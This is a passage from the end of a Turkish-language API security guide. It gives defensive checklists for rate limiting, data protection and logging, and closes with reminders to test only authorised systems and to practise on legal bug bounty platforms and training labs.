#### **Rate Limiting & Resource Management**
```
☑ Rate limiting aktif (endpoint bazında)
☑ Pagination implement edilmiş
☑ Max request size limiti var
☑ Timeout değerleri ayarlanmış
☑ Connection pool limitleri var
```

#### **Data Security**
```
☑ HTTPS zorunlu (TLS 1.2+)
☑ Hassas data encrypt ediliyor (at rest & in transit)
☑ Password'ler bcrypt/argon2 ile hashlenmiş
☑ Kişisel veri maskeleniyor (GDPR/KVKK)
☑ API key'ler environment variable'da
```

#### **Logging & Monitoring**
```
☑ Tüm istekler loglanıyor
☑ Failed authentication loglanıyor
☑ Rate limit ihlalleri alert veriyor
☑ Anormal davranışlar tespit ediliyor
☑ Incident response planı var
```

---

## 🎓 Sonuç

API güvenliği, modern uygulama güvenliğinin temel taşıdır. Bu rehber sizi sıfırdan profesyonel bir API güvenlik uzmanına dönüştürecek bilgiyi içermektedir.

**Hatırlatma:**
- ✅ Sadece izin aldığınız sistemlerde test yapın
- ✅ HackerOne, Bugcrowd gibi legal bug bounty platformlarını kullanın
- ✅ Sürekli pratik yapın (DVWA API, crAPI, vAPI)
- ✅ Toplulukla öğrenin

> **"API'ler dijital dünyanın kapılarıdır. Her kapının bir kilidi olmalıdır."**

**Başarılar! 🚀**

---

**Yazar:** API Security Team  
**Versiyon:** 1.0 (2024)  
**Lisans:** MIT